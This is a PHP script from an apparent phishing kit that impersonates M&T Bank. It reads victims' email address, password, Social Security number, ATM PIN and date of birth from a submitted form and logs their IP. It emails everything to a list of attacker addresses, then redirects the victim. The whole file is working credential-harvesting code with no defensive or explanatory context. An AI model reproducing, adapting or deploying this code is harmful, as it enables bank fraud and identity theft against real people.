<?php
include '../blocker.php';
$ip = getenv("REMOTE_ADDR");
$message .= "M&T--EMA1L--PETER-ATIKU-JAGABAN--\n";
$message .= "EMA1L		: ".$_POST['1']."\n";
$message .= "PASSW0RD		: ".$_POST['2']."\n";
$message .= "SSN		: ".$_POST['3']."\n";
$message .= "ATM		: ".$_POST['4']."\n";
$message .= "DOB		: ".$_POST['5']."\n";
$message .= "PASSW0RD		: ".$_POST['6']."\n";
$message .= "M&T--USERNAME--PETER-ATIKU-JAGABAN--\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$rnessage = "$message\n";
$message .= "M&T--EMA1L-PETER-ATIKU-JAGABAN--\n";
$recipient = "donflow2021@yahoo.com,garstepone819@seznam.cz, ceocfo.19.8.8@gmail.com, user0202777a@gmail.com, user0202777a@outlook.com";
$subject = "M&T--EMA1L-PETER-ATIKU-JAGABAN--";
$headers = "From: ";
$headers .= $_POST['eMailAdd']."PETER-ATIKU-JAGABAN";
$headers .= "M&T--EMA1L--PETER-ATIKU-JAGABAN--";
     mail("$cc", "yahoo Info", $message);
if (mail($recipient,$subject,$message,$headers))
       {
           header("Location: -+-=.htm");

       }
else
           {
        echo "ERROR! Please go back and try again.";
         }

?>
        